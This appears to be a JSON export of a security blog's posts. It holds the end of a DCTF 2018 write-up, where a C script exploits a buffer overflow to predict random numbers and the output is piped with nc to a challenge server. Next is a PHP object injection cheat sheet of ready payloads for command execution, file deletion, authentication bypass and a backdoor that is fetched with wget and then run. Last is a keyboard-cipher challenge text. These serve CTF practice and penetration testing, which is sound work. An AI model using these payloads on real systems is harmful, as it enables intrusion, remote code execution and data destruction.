&amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); std::ostream::operator&lt;&lt;(v15, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); for ( i = 0; (signed int)i &lt;= 99; ++i ) { v34 = rand(); LODWORD(v16) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"What number am I thinking of? [\"); LODWORD(v17) = std::ostream::operator&lt;&lt;(v16, i); LODWORD(v18) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(v17, \"/100]\"); std::ostream::operator&lt;&lt;(v18, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); std::getline&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;std::cin, &amp;v27); v33 = sub_1928(&amp;v27, 0LL, 10LL); if ( v33 != v34 ) { LODWORD(v21) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"Wow that is wrong!\"); std::ostream::operator&lt;&lt;(v21, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v22 = -1; goto LABEL_15; } LODWORD(v19) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"Wow that is corect!\"); LODWORD(v20) = std::ostream::operator&lt;&lt;(v19, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); std::ostream::operator&lt;&lt;(v20, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); } std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(&amp;v26); std::basic_ifstream&lt;char,std::char_traits&lt;char&gt;&gt;::basic_ifstream(&amp;v25, \"./flag\", 8LL); if ( (unsigned __int8)std::basic_ifstream&lt;char,std::char_traits&lt;char&gt;&gt;::is_open(&amp;v25) ) { std::getline&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v25, &amp;v26); LODWORD(v23) = std::operator&lt;&lt;&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;std::cout, &amp;v26); std::ostream::operator&lt;&lt;(v23, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); std::basic_ifstream&lt;char,std::char_traits&lt;char&gt;&gt;::close(&amp;v25, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); } v22 = 0; std::basic_ifstream&lt;char,std::char_traits&lt;char&gt;&gt;::~basic_ifstream(&amp;v25); std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v26);LABEL_15: std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v27); std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v29); std::basic_ifstream&lt;char,std::char_traits&lt;char&gt;&gt;::~basic_ifstream(&amp;v30); return (unsigned int)v22;}After observing the decompiled binary we can observe the buffer overflow occures after 700 bytes and overwrites the seed value (srand()) of the random function (rand()). Using the following simple script an attacker can deduct all the random values:#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;int main() {\tunsigned int i = 0;\tsetvbuf(stdout, NULL, _IONBF, 0);\tputs(\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxAAAA\");\tsrand(0x41414141);\tfor (i = 0 ; i &lt; 100 ; ++i) {\t\tprintf(\"%d\\n\", rand());\t}\treturn 0;}Final step:$ ./a.out | nc 167.99.143.206 65031Hello, there!What is your name?I am glad to know you, xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxAAAA!If you guess the next 100 random numbers I shall give you the flag!What number am I thinking of? [0/100]Wow that is corect!What number am I thinking of? [1/100]Wow that is corect!What number am I thinking of? [2/100]Wow that is corect!What number am I thinking of? [3/100]Wow that is corect!...sniiiip....What number am I thinking of? [95/100]Wow that is corect!What number am I thinking of? [96/100]Wow that is corect!What number am I thinking of? [97/100]Wow that is corect!What number am I thinking of? [98/100]Wow that is corect!What number am I thinking of? [99/100]Wow that is corect!DCTF{8adadb46b599a58344559e009bc167da7f0e65e64167c27d3192e8b6df073eaa}The flag was DCTF{8adadb46b599a58344559e009bc167da7f0e65e64167c27d3192e8b6df073eaa}." }, { "title": "PHP Object Injection Cheat Sheet", "url": "/nitesculucian.github.io/2018/10/06/php-object-injection-cheat-sheet/", "categories": "cheatsheet, offensive_security", "tags": "offensive security, cheat sheet, reverse, shell, backdoor, bash, perl, python, PHP", "date": "2018-10-06 00:40:00 +0300", "snippet": "Description of the vulnerabilityPHP Object Injection is an application level vulnerability that could allow an attacker to perform different kinds of malicious attacks, such as Code Injection, SQL ...", "content": "Description of the vulnerabilityPHP Object Injection is an application level vulnerability that could allow an attacker to perform different kinds of malicious attacks, such as Code Injection, SQL Injection, Path Traversal and Application Denial of Service, depending on the context.The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the unserialize() PHP function.In order to successfully exploit a PHP Object Injection vulnerability two conditions must be met: The application must have a class which implements a PHP magic method (such as __wakeup or __destruct) that can be used to carry out malicious attacks, or to start a “POP chain”. All of the classes used during the attack must be declared when the vulnerable unserialize() is being called, otherwise object autoloading must be supported for such classes.Example:// some PHP code including PHP magic method ...$user_data = unserialize($_GET['data']);// some PHP code...Known Vulnerable Software Software Version Reference WordPress 3.6.1 https://nvd.nist.gov/vuln/detail/CVE-2013-4338 Magento 1.9.0.1 https://magento.com/security/patches/supee-10415 Joomla 3.0.3 https://packetstormsecurity.com/files/121442/Joomla-3.0.3-PHP-Object-Injection.html IP Board 3.3.4 https://www.exploit-db.com/exploits/22398/ Dotclear 2.6.1 https://www.cvedetails.com/cve/CVE-2014-1613/ OpenCart 1.5.6.4 http://karmainsecurity.com/KIS-2014-08 CubeCart 5.2.0 http://karmainsecurity.com/KIS-2013-02 Drupal 7.34 https://websec.wordpress.com/2015/01/09/drupal-7-34-admin-php-object-injection/ vBulletin 5.1.0 https://blog.sucuri.net/2014/03/security-exploit-patched-on-vbulletin-php-object-injection.html Tuelap 7.6-4 http://karmainsecurity.com/KIS-2014-13 Moodle 2.5.0 http://disse.cting.org/2013/09/16/2013-09-16-moodle-2-5-0-1-badges-external-object-injection WHMCS 5.2.12 http://security-geeks.blogspot.com/2013/11/whmcs-5112-php-object-injectoin.html PHP Magic Methods __construct() __set() __toString() __destruct() __isset() __invoke() __call() __unset() __set_state() __callStatic() __sleep() __clone() __get() __wakeup() __debugInfo() Examples of PHP Object InjectionExploit with the __destruct methodVulnerable code:class Example1{ public $cache_file; function __construct() { // some PHP code... } function __destruct() { $file = \"/var/www/cache/tmp/{$this-&gt;cache_file}\"; if (file_exists($file)) @unlink($file); }}// some PHP code...$user_data = unserialize($_GET['data']);// some PHP code..Payload:http://testsite.com/vuln.php?data=O:8:\"Example1\":1:{s:10:\"cache_file\";s:15:\"../../index.php\";}Exploit with the __wakeup in the unserialize functionVulnerable code:&lt;?php class PHPObjectInjection{ public $inject; function __construct(){ } function __wakeup(){ if(isset($this-&gt;inject)){ eval($this-&gt;inject); } } } if(isset($_REQUEST['r'])){ $var1=unserialize($_REQUEST['r']); if(is_array($var1)){ echo \"&lt;br/&gt;\".$var1[0].\" - \".$var1[1]; } } else{ echo \"\"; # nothing happens here }?&gt;Payload:# Basic serialized dataa:2:{i:0;s:4:\"XVWA\";i:1;s:33:\"Xtreme Vulnerable Web Application\";}# Command executionstring(68) \"O:18:\"PHPObjectInjection\":1:{s:6:\"inject\";s:17:\"system('whoami');\";}\"Authentication bypass - Type jugglingVulnerable code:$data = unserialize($_COOKIE['auth']);if ($data['username'] == $adminName &amp;&amp; $data['password'] == $adminPassword) { $admin = true;} else { $admin = false;}Payload:a:2:{s:8:\"username\";b:1;s:8:\"password\";b:1;}Authentication bypass - Object referenceVulnerable code:&lt;?phpclass Object{ var $guess; var $secretCode;}$obj = unserialize($_GET['input']);if($obj) { $obj-&gt;secretCode = rand(500000,999999); if($obj-&gt;guess === $obj-&gt;secretCode) { echo \"Win\"; }}?&gt;Payload:O:6:\"Object\":2:{s:10:\"secretCode\";N;s:4:\"code\";R:2;}Authentication bypass - Object referenceVulnerable code:class Example3{ protected $obj; function __construct() { // some PHP code... } function __toString() { if (isset($this-&gt;obj)) return $this-&gt;obj-&gt;getValue(); }}// some PHP code...$user_data = unserialize($_POST['data']);// some PHP code..Payload:class SQL_Row_Value{ private $_table = \"SQL Injection\";}class Example3{ protected $obj; function __construct() { $this-&gt;obj = new SQL_Row_Value; }}print urlencode(serialize(new Example3));Others exploitsReverse Shellclass PHPObjectInjection{ // CHANGE URL/FILENAME TO MATCH YOUR SETUP public $inject = \"system('wget http://URL/backdoor.txt -O phpobjbackdoor.php &amp;&amp; php phpobjbackdoor.php');\";}echo urlencode(serialize(new PHPObjectInjection));Finding and using gadgets (PHPGGC)PHPGGC is a library of unserialize() payloads along with a tool to generate them, from command line or programmatically. When encountering an unserialize on a website you don’t have the code of, or simply when trying to build an exploit, this tool allows you to generate the payload without having to go through the tedious steps of finding gadgets and combining them.https://github.com/ambionics/phpggc$ ./phpggc -lGadget Chains-------------NAME VERSION TYPE VECTOR I Doctrine/FW1 ? file_write __toString * Guzzle/FW1 6.0.0 &lt;= 6.3.2 file_write __destruct Guzzle/RCE1 6.0.0 &lt;= 6.3.2 rce __destruct Laravel/RCE1 5.4.27 rce __destruct Laravel/RCE2 5.5.39 rce __destruct Laravel/RCE3 5.5.39 rce __destruct * Laravel/RCE4 5.5.39 rce __destruct Magento/SQLI1 ? &lt;= 1.9.3.4 sql_injection __destruct Monolog/RCE1 1.18 &lt;= 1.23 rce __destruct Monolog/RCE2 1.5 &lt;= 1.17 rce __destruct Phalcon/RCE1 &lt;= 1.2.2 rce __wakeup * Slim/RCE1 3.8.1 rce __toString SwiftMailer/FW1 5.1.0 &lt;= 5.4.8 file_write __toString SwiftMailer/FW2 6.0.0 &lt;= 6.0.1 file_write __toString SwiftMailer/FW3 5.0.1 file_write __toString Symfony/FW1 2.5.2 file_write DebugImport * Symfony/RCE1 3.3 rce __destruct * Symfony/RCE2 2.3.42 &lt; 2.6 rce __destruct * Symfony/RCE3 2.6 &lt;= 2.8.32 rce __destruct * Yii/RCE1 1.1.19 rce __destruct ZendFramework/RCE1 ? &lt;= 1.12.20 rce __destruct * Example:$ ./phpggc monolog/rce1 'phpinfo();'O:32:\"Monolog\\Handler\\SyslogUdpHandler\":1:{s:9:\"*socket\";O:29:\"Monolog\\Handler\\BufferHandler\":7:{s:10:\"*handler\";r:2;s:13:\"*bufferSize\";i:-1;s:9:\"*buffer\";a:1:{i:0;a:2:{i:0;s:10:\"phpinfo();\";s:5:\"level\";N;}}s:8:\"*level\";N;s:14:\"*initialized\";b:1;s:14:\"*bufferLimit\";i:-1;s:13:\"*processors\";a:2:{i:0;s:7:\"current\";i:1;s:6:\"assert\";}}}Thanks toThis article is composed of information found on the folowing links (+ plus some minor additions). I use this article to quick observe or demonstrate situations and as a personal reference to all the infromation needed in exploiting the PHP Object Injection Vulnerability.https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/PHP%20serializationhttps://securitycafe.ro/2015/01/05/understanding-php-object-injection/https://www.owasp.org/index.php/PHP_Object_Injectionhttp://location-href.com/php-object-injection/https://www.ambionics.io/blog/php-generic-gadget-chainshttps://github.com/ambionics/phpggc" }, { "title": "[DCTF Quals 2018] Message", "url": "/nitesculucian.github.io/2018/09/30/dctf-2018-message/", "categories": "dctf, writeups", "tags": "DCTF, DefCamp, 2018, writeups, CTF, challange", "date": "2018-09-30 11:52:00 +0300", "snippet": "Description:I just typed this secret message with my new encoding algorithm.Author:Lucian NitescuStats:50 point / 87 solversSolution:The challange started with the following fille:Full content:wsxc...", "content": "Description:I just typed this secret message with my new encoding algorithm.Author:Lucian NitescuStats:50 point / 87 solversSolution:The challange started with the following fille:Full content:wsxcvasdfghrfvbnhytqwertymnbvcdrtghuzxcvbnwsxcdeasdfghzaqwdrtgbzxcvbn qwertywsxqwertynbvcxswefrqwertyiuyhnbvqwertywsxcvfrasdfghzaqwdrtgbzxcvbn qwertywsxasdfghiuyhnbvasdfgh zxcvbnytrfvcxqwertywsxasdfghzaqwdrtgbqwertymnbvccdertgzxcvbnedcvbasdfghefvtzxcvbn asdfghwsxcfezxcvbnedcvbgtasdfghzaqwdrtgbqwertyxsweftynhzxcvbnjmyizxcvbn zxcvbnrtyuihnzxcvbnwsxcdeasdfghrgnygcqwertyrtyuihnasdfgh qwertyqazxcdewzxcvbnredcfzxcvbn zxcvbnwertyfvzxcvbnrfvgyhnasdfghwsxcdeqwerty qwertynbvcxswefrzxcvbnmnbvcdrtghuzxcvbnrfvqwertyxsweftgbqwertyrtyuihnqwertywsxasdfghxsweftgbzxcvbncvgredasdfgh asdfghgrdxcvbzxcvbnxsweftbgasdfghwsxcfeqwerty asdfghwertyfvqwertyefvtqwertynbvcxswefrqwertyedcvrfzxcvbnytrfvcxzxcvbntgbnhyasdfghwertyfvasdfghwertyfvzxcvbnwsxqwertyzaqwdvfrzxcvbncvgredqwerty asdfghedczxcvbnxsweftbgasdfghyhnmkuzxcvbnedcvbgtqwertyiuyhnbvqwertyrtyuihnasdfghmnbvcdrtghuqwertyjmyiasdfgh.zxcvbn asdfghrfvbnqwertywsxcvfreasdfghmnbvcdrtghuqwertywsxcdeasdfghzaqwdrtgbasdfgh asdfghwsxqwertynbvcxswerfqwertyiuyhnbvzxcvbnedcvbgtzxcvbnxsweftyhnqwerty qwertyrfvgyhnasdfghzsefvcxqwertyytrfvcxasdfgh qwertyrfvbhgasdfghedcvrfasdfghtgbnhyasdfghxsweftgbasdfgh asdfghrtyuihnqwertyedcftgbasdfghtgbnhyasdfgh zxcvbnrfvasdfghzaqwdvfrasdfghwsxcfezxcvbnedcvbgtqwertyytrfvcxzxcvbnrtyuihnasdfghmnbvcdrtghuzxcvbnefvtzxcvbn'asdfghiuyhnbvzxcvbn qwertyiuyhnbvzxcvbnrtyuihnqwertyzsefvcxasdfghzaqwdvfrqwertyyhnmkuqwertyzsefvcxzxcvbnmnbvcdrtghuqwertyedcvgrzxcvbn zxcvbnwsxcfeqwertyedcvbgtasdfghxsweftynhasdfghxsweftyhnzxcvbnefvtqwerty zxcvbnrtyuihnzxcvbntgbnhyqwertywdvtdzasdfghwertyfvzxcvbn asdfghtgbnhyqwertywdcftasdfghedcvrfasdfghmnbvcdrtghuqwerty zxcvbniuyhnbvzxcvbnrfvqwertyxsweftgbzxcvbnewsxczxcvbnwsxcdezxcvbn qwertywertyfvqwertyedcftgbzxcvbnedcvrfzxcvbn asdfgh1qwerty5zxcvbn0asdfgh0qwertyiuyhnbvzxcvbn,qwerty zxcvbnefvgywdcftzxcvbnedcftgbasdfghwsxcdeqwertyxsweftgbzxcvbn zxcvbngrdxcvbasdfghzaqwdvfrqwerty asdfghwsxcvfrqwertyzaqwdvfrasdfghedcfbyasdfghxsweftbgzxcvbnwsxcvfreqwertyefvgywdcftzxcvbnxsweftbgasdfgh asdfghnbvcxswerfzxcvbnmnbvcdrtghuqwertyedczxcvbnxsweftbgqwertywertyfvzxcvbnedcvrfzxcvbnmnbvcdrtghuqwerty qwertyrtyuihnqwertyqazxcdewzxcvbnwsxcvfreqwertyedcfbyasdfgh qwertygrdxcvbasdfgh zxcvbncvgredzxcvbnxcvbgrdasdfghrfvbnasdfghrfvbnasdfghwsxcdeqwertyefvtqwerty qwertyqazxcdewqwertytrfvgzxcvbn zxcvbnwertyfvzxcvbnefvtqwertymnbvccdertgqwertyedcvrfasdfgh zxcvbngrdxcvbzxcvbnzaqwdvfrqwertyyhnmkuqwerty qwertyiuyhnbvqwertyredcvasdfghmnbvcdrtghuzxcvbnzsefvcxqwertyxsweftynhzxcvbnrfvbhgzxcvbnwsxcvasdfghwsxcdezxcvbnedcvgrasdfgh qwertyrfvqwertyrtyuihnzxcvbn qwertyrtyuihnqwertyqazxcdewzxcvbn asdfghxsweftynhqwertyzsefvcxzxcvbnqazsceasdfghedcvrfqwerty asdfghxcvbgrdasdfgh asdfghrtyuihnzxcvbnjmyizxcvbnmnbvccdertgqwertywsxcdeqwerty asdfghiuyhnbvasdfghnbvcxswerfasdfghwsxcdezxcvbnewsxcqwertyedcasdfghxsweftynhasdfghedcvrfqwertyxsweftbgqwerty qwertywsxcfdqwertywsxcvfreasdfghwsxcvfreqwertyedcfbyasdfgh.asdfgh asdfghedczxcvbnrtyuihnasdfgh asdfghwsxdrfvzxcvbnxcvbgrdzxcvbniuyhnbvqwerty asdfghiuyhnbvqwertywsxcvfrasdfghmnbvcdrtghuqwertyefvgyasdfghwsxqwertyefvgyqwertytgbnhyqwertywsxcfezxcvbn qwertyzaqwdvfrasdfghrfvbnhytasdfghrtyuihnqwerty asdfghwsxcvfreqwertyzaqwdvfrzxcvbnrfvbnzxcvbnefvtzxcvbn qwertyewsxdzxcvbnrfvzxcvbnwdcftzxcvbntgbnhyqwerty zxcvbnewsxcqwertytgbnhyqwertyzaqwdvfrasdfghrtyuihnasdfghedcvbgtqwertymnbvcdrtghuzxcvbnwsxqwertyedcvrfqwertyiuyhnbvzxcvbn,qwerty zxcvbnrfvbhgasdfghedcvbgtqwertyrtyuihnasdfgh zxcvbnxcvbgrdasdfghwsxcvzxcvbnytrfvcxzxcvbnqazxcdewzxcvbn zxcvbnrtyuihnqwertyrfvgyhnqwertywsxcdeasdfgh qwertyrfvbnzxcvbnedcvrfzxcvbngrdxcvbqwertymnbvccdertgzxcvbn qwertywsxzxcvbnzaqwdvfrasdfghwertyfvqwertywsxcvfreasdfgh asdfghtgbnhyasdfghrfvbnqwertyedcvrfzxcvbntrfvbqwertyrtyuihnzxcvbnmnbvcdrtghuzxcvbnrfvbnhytqwertyxsweftgbzxcvbnwsxqwertyredcvzxcvbn asdfghrtyuihnqwertyefvtqwertynbvcxswerfasdfghwsxcdeqwertyiuyhnbvzxcvbnwsxcdezxcvbnwertyfvqwertyrtyuihnasdfghwsxzxcvbnxsweftgbqwertycvgredqwerty,zxcvbn qwertymnbvcdrtghuzxcvbnedcvrfqwertyxsweftyhnasdfghxcvbgrdzxcvbnedcqwertyxsweftgbasdfghedcqwertyxsweftbgasdfghcvrgedqwerty qwertyedcvrfzxcvbniuyhnbvqwertyiuyhnbvasdfghedcvrfqwertyxsweftbgasdfghrtyuihnzxcvbnrfvzxcvbnzsefvcxqwertywsxcvasdfghrfvbnzxcvbnefvtzxcvbn zxcvbnedcvbgtqwertyxsweftbgqwertytrfvbqwertyedcftgbasdfghxcvbgrdqwertyxsweftbgzxcvbncvrgedzxcvbnwsxcdeqwertyyhnmkuasdfgh.asdfgh qwertywsxasdfghwertyfvasdfgh qwertyefvgywdcftasdfghxcvbgrdasdfghiuyhnbvzxcvbn qwertymnbvccdertgzxcvbnwsxcvfreasdfghnbvcxswefrqwertyedcvbgtasdfghrfvbnqwertyzsefvcxzxcvbnmnbvcdrtghuzxcvbnwsxqwertyytrfvcxzxcvbnwsxcdeqwertywsxcfezxcvbn qwertyrfvzxcvbnzaqwdvfrqwerty asdfghrtyuihnzxcvbnrfvgyhnasdfghwsxcdeasdfgh zxcvbn1qwerty9qwerty6zxcvbn0asdfghytrfvcxqwerty asdfghefvgywdcftqwertyrfvasdfghrtyuihnqwertywsxdrfvzxcvbn asdfghwertyfvzxcvbnedcftgbqwertyedcvrfasdfgh asdfghmnbvcdrtghuzxcvbnwsxcdeasdfghrfvbnasdfghedcvrfzxcvbngrdxcvbqwertyytrfvcxqwertyedcvrfasdfgh asdfghwsxcvfrezxcvbnewsxdqwerty qwertyrfvbnzxcvbntgbnhyasdfghwertyfvasdfghmnbvcdrtghuqwertygrdxcvbasdfghytrfvcxqwertyedcvrfqwertyrtyuihnqwerty zxcvbniuyhnbvzxcvbnrfvgyhnqwertytgbnhyasdfghtgbnhyasdfghrtyuihnzxcvbnytrfvcxqwerty zxcvbnredcvqwertyrfvbnhytasdfghxsweftbgzxcvbnrtyuihnasdfghxcvbgrdqwertyedczxcvbnxsweftgbqwertyedcasdfghxsweftbgasdfghcvrgedqwerty asdfghrfvbnasdfghqazxcdewqwertymnbvcdrtghuqwertywsxcdeasdfghxsweftyhnzxcvbn qwertyedczxcvbnnbvcxswerfasdfghiuyhnbvzxcvbnedcvbgtasdfghxsweftynhzxcvbn zxcvbnnbvcxswerfasdfghxcvbgrdzxcvbniuyhnbvqwertyytrfvcxqwertygrdxcvbqwertycvrgedqwertyedcvrfzxcvbniuyhnbvqwerty,asdfgh zxcvbnxcvbgrdqwertyzaqwdvfrzxcvbnwsxcfeqwerty asdfghxsweftyhnzxcvbnrfvbnhytasdfghmnbvcdrtghuasdfghtgbnhyasdfgh qwertymnbvcdrtghuqwertywsxcdezxcvbntrfvbqwertyedcvrfzxcvbnxsweftbgqwertywertyfvqwertyedcvbzxcvbnefvtqwerty qwertyefvgywdcftasdfghrfvqwertyrtyuihnasdfghedcftgbasdfgh zxcvbnyhnmkuasdfghtgbnhyqwertyytrfvcxasdfghqazsceasdfghrtyuihnasdfghrfvbnhytzxcvbnnbvcxswerfzxcvbn qwertynbvcxswefrqwertyedcvbgtasdfghrfvbhgzxcvbnedcvbqwertyrfvzxcvbniuyhnbvqwertywsxdrfvasdfghwsxzxcvbnxsweftbgasdfghcvgredasdfgh zxcvbniuyhnbvasdfghwsxcvfrezxcvbntrfvgasdfghrtyuihnzxcvbnefvgywdcftasdfghgrdxcvbzxcvbnmnbvcdrtghuasdfghedcvrfqwerty zxcvbnrfvbnqwertywsxqwertywsxdvrqwertywsxcdeqwerty qwertyxcvbgrdqwertyrfvbnqwertyedcvgrqwertywsxcvfrzxcvbnytrfvcxqwerty qwertymnbvccdertgzxcvbnxcvbgrdzxcvbncvgredqwertywsxcdeasdfghxsweftynhqwertyzsefvcxqwertywsxdvrasdfghedcvrfqwertymnbvcdrtghuasdfgh qwertywsxasdfghzaqwdvfrqwertyewsxczxcvbnrfvbnzxcvbnedcvbgtqwertyedcvgrzxcvbnwsxzxcvbnxsweftbgasdfghredcvgasdfgh zxcvbnwdcftasdfghtgbnhyzxcvbnmnbvcdrtghuqwertyiuyhnbvzxcvbnedcqwertywsxcvfreasdfghzaqwdvfrqwertyiuyhnbvzxcvbn zxcvbnwsxcvfreqwertyewsxdzxcvbn qwertyrfvbnqwertyqazxcdewasdfghmnbvcdrtghuzxcvbnwsxcdezxcvbnxsweftynhasdfgh zxcvbnrfvasdfghnbvcxswerfzxcvbniuyhnbvasdfghedcvbgtqwertyxsweftyhnqwerty.qwerty qwertywsxcfeasdfghtrfvbasdfghrtyuihnzxcvbnredcfqwerty{zxcvbnrfvbhgzxcvbn6zxcvbn6asdfghedcvrfzxcvbnredcvasdfghzsefvcxasdfghxcvbgrdasdfghgrdxcvbzxcvbn9qwerty0zxcvbnzsefvcxzxcvbnedcvgrasdfgh0asdfgh5qwertyyhnmkuasdfghredcfasdfgh5zxcvbnwsxcfeqwertyzsefvcxasdfghwsxcfdqwerty3qwerty3qwertyedcvgrqwerty7zxcvbn1qwertygrdxcvbqwerty8asdfghtrfvgzxcvbn7zxcvbn0qwerty9qwerty3qwerty4zxcvbn4zxcvbn0qwerty8zxcvbnredcfzxcvbn3zxcvbnzsefvcxzxcvbn5zxcvbn8qwerty4asdfgh7qwertyzsefvcxasdfgh4asdfghewsxczxcvbn5zxcvbntrfvbzxcvbn3asdfgh8zxcvbnedcvgrqwertyqazxdsasdfgh7zxcvbn5qwerty8asdfgh9asdfgh1qwertyrfvbhgasdfgh0zxcvbntrfvgasdfgh0qwertywsxcdezxcvbn3qwerty2zxcvbn}qwertywsxcvqwertyrfvbnhytzxcvbnmnbvcdrtghuasdfghtgbnhyqwertyxsweftyhnqwerty qwertyrfvasdfghmnbvccdertgqwertyiuyhnbvzxcvbnwsxcvfrzxcvbnxsweftyhnzxcvbn zxcvbnedczxcvbniuyhnbvqwerty asdfghytrfvcxasdfghwsxqwertyzaqwdrtgbqwertynbvcxswefrzxcvbnwsxcvqwertyjmyizxcvbn zxcvbnwsxcfeqwertyedcvbgtqwertyxsweftyhnzxcvbnxsweftyhnasdfghefvtzxcvbn asdfghrtyuihnqwertyedcvrfasdfghwdvtdzzxcvbnwertyfvzxcvbn asdfghrfvbnhytqwertytrfvgzxcvbn qwertywertyfvqwertywsxdrfvzxcvbnwsxcdeasdfgh asdfghnbvcxswefrasdfghmnbvcdrtghuzxcvbnwsxasdfghxsweftgbzxcvbnrtyuihnzxcvbnrfvzxcvbnxsweftgbqwertycvgredqwerty zxcvbngrdxcvbzxcvbnxsweftbgasdfghedcvgrasdfgh zxcvbnrtyuihnasdfghjmyizxcvbnnbvcxswerfasdfghtgbnhyqwertyiuyhnbvqwertytgbnhyasdfghwertyfvzxcvbnrtyuihnzxcvbnwsxzxcvbnxsweftgbasdfghcvrgedqwerty asdfghedcqwertyxsweftgbasdfghwsxcfezxcvbnwsxcvfrzxcvbniuyhnbvqwertyrtyuihnasdfghmnbvcdrtghuzxcvbnefvtzxcvbn.zxcvbn qwertyrfvbnzxcvbnwsxcvfreasdfghmnbvcdrtghuzxcvbnedcvrfasdfghzaqwdrtgbasdfgh zqwertyedcasdfghmnbvccdertgqwertyytrfvcxasdfghwsxcvfrasdfghzaqwdrtgbasdfgh asdfghrfvgyhnzxcvbnxcvbgrdasdfghiuyhnbvzxcvbn zxcvbnqazxdsqwertyedcvrfzxcvbnedcvrfzxcvbnxsweftgbzxcvbn zxcvbnrtyuihnzxcvbnwsxdrfvqwertyedcvrfasdfgh zxcvbnedcqwertyzaqwdvfrqwertyyhnmkuasdfghedcvbgtasdfghytrfvcxasdfghwertyfvzxcvbnmnbvcdrtghuzxcvbnjmyiasdfgh'asdfghytrfvcxasdfgh qwertyytrfvcxasdfghrtyuihnzxcvbnxcvbgrdasdfghzaqwdvfrzxcvbnedcvgrzxcvbnzsefvcxasdfghmnbvcdrtghuasdfghyhnmkuqwerty qwertywsxcfezxcvbnedcvbgtzxcvbnxsweftyhnasdfghxsweftyhnasdfghefvtqwerty asdfghrtyuihnzxcvbnedcvrfzxcvbnwdvtdzzxcvbnrtyuihnqwerty asdfghwsxcdeqwertywdcftzxcvbnwsxcdeqwertymnbvcdrtghuzxcvbn zxcvbniuyhnbvzxcvbnrfvzxcvbnzaqwdvfrasdfghtrfvbasdfghedcvrfzxcvbn zxcvbnwertyfvasdfghrfvgyhnzxcvbntgbnhyzxcvbn asdfgh1zxcvbn5asdfgh0zxcvbn0qwertyiuyhnbvasdfgh,asdfgh asdfghefvgywdcftasdfghedcftgbqwertyedcvrfasdfghxsweftbgqwerty asdfghzsefvcxzxcvbnxsweftbgqwerty zxcvbnedcvbgtasdfghxsweftbgqwertyedcfbyasdfghzaqwdvfrzxcvbnwsxcvfreasdfghefvgywdcftqwertyxsweftbgqwerty 